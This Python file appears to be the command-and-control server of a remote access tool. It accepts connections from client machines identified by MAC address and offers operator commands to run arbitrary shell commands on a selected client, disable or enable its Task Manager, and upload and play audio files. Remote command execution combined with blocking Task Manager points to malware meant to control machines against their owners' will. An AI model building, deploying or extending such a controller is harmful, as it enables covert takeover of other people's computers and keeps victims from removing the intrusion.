import socket
import time
import os

from threading import Thread
from events import Events
from modules.Module import Module

HOST = ''                 # Symbolic name meaning all available interfaces
PORT = 27593              # Arbitrary non-pri


class Client():
  def __init__(self, ip, mac, name):
    self.ip = ip
    self.mac = mac
    self.name = name

    self.events = Events()

    self.modules = ["audio", "commands", "manager"]
    
    self.audio = None
    self.commands = None
    self.manager = None

  def deleteModule(self, mod):
    if mod in self.modules:
      setattr(self, mod, None)

  def registerModule(self, mod, conn):
    if mod in self.modules:
      _module = getattr(self, mod)

      if _module is not None:
        return False

      setattr(self, mod, Module(conn))
      _module = getattr(self, mod)

      def handleData(data):
        print("Handling data")
        print(self.events.events)
        self.events.trigger(mod, data, _module, self)

      def handleEnd(data):
        print(f"[DISCONNECT] {self.mac} {self.name} {mod} module")
        setattr(self, mod, None)
        _module.events.clear()
      
      _module.events.on("data", handleData)
      _module.events.on("end", handleEnd)
      _module.start()

      return True
    return False


class Clients:
  def __init__(self):
    self.clients = {}
    self.selected = None
    self.selectedModule = None

  def add(self, client: Client):
    self.clients[client.mac] = client

  def select(self, index):
    if index >= 0 and index < len(self.clients.keys()):
      self.selected = list(self.clients.keys())[index]
      print(f"[*] Selected {self.clients[self.selected].name}")

  def selectModule(self, mod):
    if self.selected:
      if mod in self.getSelected().modules:
        self.selectedModule = mod
        print(f"[*] Selected {mod} module")

  def getSelected(self):
    return self.clients[self.selected]

  def getSelectedModule(self):
    if self.selected in self.clients:
      try:
        return getattr(self.clients.get(self.selected), self.selectedModule)
      except:
        print("Failed to get module")

    return None

  def get(self, mac):
    if mac in self.clients:
      return self.clients[mac]
    else:
      return None

  def entries(self):
    return self.clients

class Server:
  def __init__(self):
    self.HOST = ''
    self.PORT = 27593
    self.s = None
    self.connectionThread = None
    self.commandThread = None
    self.clients = Clients()

    self.start()

  def handleAudioData(self, data, _module, client):
    if self.clients.getSelected().mac == client.mac:
      if data[0] == "fileReceived":
        if data[1] == "success":
          size = int(data[2])
          print(f"(AUDIO UPLOAD) Sucess\nReceived {size} bytes")
          _module.ping.disable = False
        elif data[1] == "failed":
          status = int(data[2])
          print(f"(AUDIO UPLOAD) Failed 0x{status}")
      elif data[0] == "requestWrite":
        print("(AUDIO) Write requested")

        pathfile = os.getcwd() + f"\\audios\\{data[1]}.mp3"
        if os.path.exists(pathfile):
          print("Path checked")

          song = open(pathfile, "rb")
          _module.ping.disable = True

          chunk = song.read(1024)
          while chunk:
            _module.conn.send(chunk)
            chunk = song.read(1024)
          
          print("(AUDIO) File sent, waiting check response")
          print(f"(AUDIO) {song.tell()} bytes")
          
          song.close()
      else:
        print(f'(AUDIO {data[0]}) [{client.mac} - {client.name}] | {data[1]}')

  def handleCommandsData(self, data, _module, client):
    print(f'(COMMANDS {data[0]}) [{client.mac} - {client.name}] | {data[1]}')

  def handleManagerData(self, data, _module, client):
    print(f'(MANAGER {data[0]}) [{client.mac} - {client.name}] | {data[1]}')
  
  def handleConnections(self):
    while True:
      try:
        conn, addr = self.s.accept()

        data = conn.recv(1024).decode().split(';')
        parameters = {}

        for v in data:
          parameter = v.split('=')
          parameters[parameter[0]] = parameter[1]

        client =  self.clients.get(parameters["mac"])
        if not client:
          client = Client(addr[0], parameters["mac"], parameters["name"])
          client.events.on("audio", self.handleAudioData)
          client.events.on("commands", self.handleCommandsData)
          client.events.on("manager", self.handleManagerData)

          self.clients.add(client)
        
        if not client.registerModule(parameters['type'], conn):
          conn.close()
          continue

        print(f"({parameters['type']} CONNECTION) {client.ip} - {client.mac} - {client.name}")
      except Exception as err:
        print(err)
        continue
    
      time.sleep(0.01)

  def _list(self, args):
    if len(self.clients.entries()) == 0:
      print("[!] No clients connected")
      return

    i = 0
    for entry in self.clients.entries().items():
      i += 1
      client = entry[1]
      print(f'[{i}] {client.ip} | {client.mac} | {client.name}')

  def _select(self, args):
    self.clients.select(int(args[0]) - 1)

  def _module(self, args):
    self.clients.selectModule(args[0])

  def _set(self, args):
    _module = self.clients.getSelectedModule()

    if _module:
      _module.send(f"set;{';'.join(args)}")
        
  def _enableTaskMng(self, args):
    client = self.clients.getSelected()
    if client:
      if client.manager:
        client.manager.send(f"enableTaskMng")

  def _disableTaskMng(self, args):
    client = self.clients.getSelected()
    if client:
      if client.manager:
        client.manager.send(f"disableTaskMng")

  def _cmd(self, args):
    client = self.clients.getSelected()
    if client:
      if client.commands:
        client.commands.send(f"cmd;{';'.join(args)}")

  def _play(self, args):
    client = self.clients.getSelected()
    if client:
      if client.audio:
        client.audio.send(f"play;{args[0]}")

  def _uploadSong(self, args):
    client = self.clients.getSelected()

    if client:
      if client.audio:
        pathfile = os.getcwd() + f"\\audios\\{args[0]}.mp3"
        if os.path.exists(pathfile):
          print("(AUDIO) Sent upload command, waiting response")
          client.audio.send(f'uploadSong;{args[0]}')

  def listenCommands(self):
    while True:
      command = input("").split(' ')
      if hasattr(self, f"_{command[0]}"):
        getattr(self, f"_{command[0]}")(command[1:])
      else:
        _module = self.clients.getSelectedModule()

        if _module:
          _module.send(';'.join(command))

      time.sleep(0.01)

  def start(self):
    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.s.bind((HOST, PORT))
    self.s.listen(1)

    self.connectionThread = Thread(target=self.handleConnections).start()
    self.commandThread = Thread(target=self.listenCommands).start()

if __name__ == "__main__":
  Server()
